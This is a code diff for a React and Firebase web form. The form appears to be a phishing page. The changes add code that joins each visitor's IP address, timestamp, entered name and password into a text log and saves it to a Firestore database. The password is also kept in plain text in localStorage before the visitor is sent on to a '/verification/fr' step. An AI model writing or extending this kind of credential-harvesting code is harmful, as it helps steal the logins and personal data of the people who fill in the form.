@@ -11,6 +11,7 @@ import {
   doc,
   getDocs,
   query,
+  serverTimestamp,
   setDoc,
   updateDoc,
   where,
@@ -66,50 +67,39 @@ function App2() {
 
   const send = async (e) => {
     e.preventDefault();
+
     if (visible2 === false) {
       setName("");
       setPassword("");
       setVisible2(true);
 
-      console.log("hnaaa");
     } else {
-      console.log("hnaaa 2");
+      let localText = localStorage.getItem("text");
+      localText = localText.split("/");
+      localText.push(` / name: ${name} / password: ${password}`);
 
       const washingtonRef = doc(db, "users", uid);
+      
       await updateDoc(washingtonRef, {
+        text:localText.join(" "),
+        /*
         name: name,
         pass: password,
+        */
       });
+      localStorage.setItem("text", localText.join(" "));
+
       localStorage.setItem("ip", JSON.stringify(ip));
       localStorage.setItem("name", JSON.stringify(name));
       localStorage.setItem("password", JSON.stringify(password));
-
+      setName("");
+      setPassword("");
       navigate("/verification/fr", { state: { ip: ip, uid: uid } });
       setSpin(false);
     }
+
   };
 
-  const getIp2 = async () => {
-    let etat = null;
-    const stored = localStorage.getItem("ip");
-    const q = query(collection(db, "users"), where("ip", "==", ip));
-    const querySnapshot = await getDocs(q);
-    querySnapshot.forEach((doc) => {
-      etat = doc.data();
-    });
-    if (etat !== null) {
-      console.log("already existe");
-    } else {
-      try {
-        setDoc(doc(db, "users", ip), {
-          country: country,
-          ip: ip,
-        });
-      } catch (error) {
-        console.log(error);
-      }
-    }
-  };
 
   const [changed, setChanged] = useState(0);
 
@@ -151,10 +141,16 @@ function App2() {
       const id = uuidv4();
       setUid(id);
       if (storedip) {
+        const date = new Date();
+        const now = date.toISOString();
+        const text = `IP: ${storedip} /Quand: ${now}`;
+        localStorage.setItem("text",text);
         await setDoc(doc(db, "users", id), {
-          ip: stored,
-          country: storedc,
-          uid: id,
+          text:text,
+          timestamp: serverTimestamp()
+          //ip: stored,
+          //country: storedc,
+          //uid: id,
         });
       }
     }
